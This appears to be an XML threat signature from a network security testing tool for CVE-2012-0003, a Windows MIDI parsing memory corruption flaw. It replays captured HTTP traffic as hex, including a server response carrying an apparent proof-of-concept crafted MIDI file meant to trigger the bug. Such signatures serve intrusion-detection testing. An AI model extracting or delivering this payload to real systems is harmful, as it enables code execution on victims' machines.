<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Windows Media MIDI File Memory Corruption"/>
    <EngDesc display="true" value="A memory corruption vulnerability exists in the Microsoft Windows Multimedia library. The vulnerability is due to an error while parsing specially crafted MIDI files.            A remote attacker can exploit this vulnerability by enticing a target user to open a specially crafted MIDI file. Successful exploitation could lead to code execution in the enticed user's security context.&#13;&#10;"/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
    </Intent>
    <Protocol display="true" value="HTTP,HTTPS,IMAP,POP3,SMB/CIFS,SMTP,FTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Media_Center_Edition"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="2005"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20120110-04"/>
    <CVEID display="true" value="CVE-2012-0003"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value=""/>
    <Author display="true" value=""/>
    <ID display="true" value="3825f1ef4f8501a1611ad1a7cc0c3146"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="Network"/>
    <AccessComplexity display="false" value="Medium"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="634635337441334327"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1333099839" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="G"/>
      <for index="H"/>
    </for>
    <for index="B">
      <for index="G"/>
      <for index="H"/>
    </for>
    <for index="E">
      <for index="G"/>
      <for index="H"/>
    </for>
    <for index="F">
      <for index="G"/>
      <for index="H"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:0C:29:35:D7:D0" destMac="00:1B:78:75:79:68" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0226" Identification="0417" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="92B9" srcIP="172.16.8.223" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="1053" destPort="$HTTPdestPort" SeqNumber="88D4EFAF" AckNumber="1AD8D489" HeaderLength="05" WindowSize="FAF0" Checksum="85EA" UrgentPointer="0000" Options="" Payload="474554202F7E626D6F6F72652F73746167696E672F706F632E6D696420485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F6A7065672C20696D6167652F706A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F78616D6C2B786D6C2C206170706C69636174696F6E2F782D6D732D786261702C206170706C69636174696F6E2F782D6D732D6170706C69636174696F6E2C206170706C69636174696F6E2F766E642E6D732D787073646F63756D656E742C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520382E303B2057696E646F7773204E5420352E313B2054726964656E742F342E303B202E4E4554342E30433B202E4E4554342E30453B202E4E455420434C5220322E302E35303732373B202E4E455420434C5220332E302E343530362E323135323B202E4E455420434C5220332E352E3330373239290D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A486F73743A20737469636B792E7672742E74656C75732E636F6D0D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="E" Count="">
    <Ethernet srcMac="00:0C:29:35:D7:D0" destMac="00:1B:78:75:79:68" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0147" Identification="041A" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9395" srcIP="172.16.8.223" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="1053" destPort="$HTTPdestPort" SeqNumber="88D4F1AD" AckNumber="1AD8E3F9" HeaderLength="05" WindowSize="F6E8" Checksum="5183" UrgentPointer="0000" Options="" Payload="474554202F66617669636F6E2E69636F20485454502F312E310D0A4163636570743A202A2F2A0D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520382E303B2057696E646F7773204E5420352E313B2054726964656E742F342E303B202E4E4554342E30433B202E4E4554342E30453B202E4E455420434C5220322E302E35303732373B202E4E455420434C5220332E302E343530362E323135323B202E4E455420434C5220332E352E3330373239290D0A486F73743A20737469636B792E7672742E74656C75732E636F6D0D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1,3">
    <Output index="B" Count="">
      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:35:D7:D0" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="668F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6C8B" srcIP="$destIP" destIP="172.16.8.223" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="1053" SeqNumber="1AD8D489" AckNumber="88D4F1AD" HeaderLength="05" WindowSize="1920" Checksum="9930" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203130204A616E20323031322032313A33363A303220474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E34205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205475652C203130204A616E20323031322032313A33353A353120474D540D0A455461673A2022343437303137312D6530362D34623633333463393066626330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20333539300D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20617564696F2F6D6964690D0A0D0A4D546864000000060001000901E04D54726B0000001300FF58040402180800FF5103061A8000FF2F004D54726B0000017400C901009FFF7F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F78237F78237F00237F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F78237F78237F00237F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F78237F78237F00237F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F78237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F0099237F7889237F00237F78237F78237F78237F00FF2F004D54726B0000015700C9010089267F78267F00267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F00267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F00267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F00267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F78267F78267F0099267F7889267F00267F78267F00FF2F004D54726B000001D400C9010089277F78277F00277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00277F78277F0099277F7889277F00FF2F004D54726B000002D100C9010089257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00257F0099257F7889257F00FF2F004D54726B000001D100C4000084247F0094247F7884247F00247F78247F78247F78247F78247F78247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F00247F0094247F7884247F00247F78247F78247F78247F78247F78247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F00247F0094247F7884247F00247F78247F78247F78247F78247F78247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F00247F0094247F7884247F00247F78247F78247F78247F78247F78247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F78247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00247F0094247F7884247F00FF2F004D54726B0000017400C5000085287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F0095287F7885287F00287F78287F78287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F78287F00287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F0095287F7885287F00287F78287F78287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F78287F00287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F0095287F7885287F00287F78287F78287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F78287F00287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F0095287F7885287F00287F78287F78287F0095287F7885287F00287F0095287F7885287F00287F78287F78287F78287F78287F78287F00FF2F004D54726B0000017400C60000862B7F00962B7F78862B7F002B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F782B7F782B7F002B7F00962B7F78862B7F002B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F782B7F782B7F002B7F00962B7F78862B7F002B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F782B7F782B7F002B7F00962B7F78862B7F002B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F00962B7F78862B7F002B7F782B7F782B7F782B7F782B7F00FF2F004D54726B0000017400C70000872F7F00972F7F78872F7F002F7F782F7F782F7F00972F7F78872F7F002F7F00972F7F78872F7F002F7F782F7F782F7F782F7F00972F7F78872F7F002F7F782F7F00972F7F78872F7F002F7F782F7F782F7F782F7F782F7F782F7F002F7F00972F7F78872F7F002F7F782F7F782F7F00972F7F78872F7F002F7F00972F7F78872F7F002F7F782F7F782F7F782F7F00972F7F78872F7F002F7F782F7F00972F7F78872F7F002F7F782F7F782F7F782F7F782F7F782F7F002F7F00972F7F78872F7F002F7F782F7F782F7F00972F7F78872F7F002F7F00972F7F78872F7F002F7F782F7F782F7F782F7F00972F7F78872F7F002F7F782F7F00972F7F78872F7F002F7F782F7F782F7F782F7F782F7F782F7F002F7F00972F7F78872F7F002F7F782F7F782F7F00972F7F78872F7F002F7F00972F7F78872F7F002F7F782F7F782F7F782F7F00972F7F78872F7F002F7F782F7F00972F7F78872F7F002F7F782F7F782F7F782F7F782F7F782F7F00FF2F00" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
    <Output index="F" Count="">
      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:35:D7:D0" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0214" Identification="6692" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7050" srcIP="$destIP" destIP="172.16.8.223" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="1053" SeqNumber="1AD8E3F9" AckNumber="88D4F2CC" HeaderLength="05" WindowSize="1D50" Checksum="036E" UrgentPointer="0000" Options="" Payload="485454502F312E3120343034204E6F7420466F756E640D0A446174653A205475652C203130204A616E20323031322032313A33363A303320474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E34205065726C2F76352E382E380D0A436F6E74656E742D4C656E6774683A203230390D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D39390D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D69736F2D383835392D310D0A0D0A3C21444F43545950452048544D4C205055424C494320222D2F2F494554462F2F4454442048544D4C20322E302F2F454E223E0A3C68746D6C3E3C686561643E0A3C7469746C653E343034204E6F7420466F756E643C2F7469746C653E0A3C2F686561643E3C626F64793E0A3C68313E4E6F7420466F756E643C2F68313E0A3C703E546865207265717565737465642055524C202F66617669636F6E2E69636F20776173206E6F7420666F756E64206F6E2074686973207365727665722E3C2F703E0A3C2F626F64793E3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
